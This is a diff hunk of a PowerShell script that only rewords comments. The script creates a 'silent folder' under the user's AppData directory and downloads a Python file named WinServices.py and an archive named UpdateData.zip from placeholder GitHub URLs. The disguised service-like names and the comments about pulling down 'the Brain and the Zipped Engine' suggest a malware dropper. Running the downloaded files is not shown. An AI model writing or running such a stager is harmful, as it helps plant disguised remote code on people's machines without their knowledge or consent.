@@ -6,10 +6,10 @@ $Path = "$env:APPDATA\$ID"
 $C_URL = "https://raw.githubusercontent.com/USER/REPO/main/WinServices.py"
 $Z_URL = "https://raw.githubusercontent.com/USER/REPO/main/UpdateData.zip"
 
-# 2. Preparation
+# 2. Preparation - Create the silent folder
 if (!(Test-Path $Path)) { New-Item -ItemType Directory -Path $Path -Force | Out-Null }
 
-# 3. Deployment - Pull down the Brain and the Zipped Engine
+# 3. Deployment - Pull the Brain and the Zipped Engine
 Invoke-WebRequest -Uri $C_URL -OutFile "$Path\WinServices.py"
 Invoke-WebRequest -Uri $Z_URL -OutFile "$Path\UpdateData.zip"
 
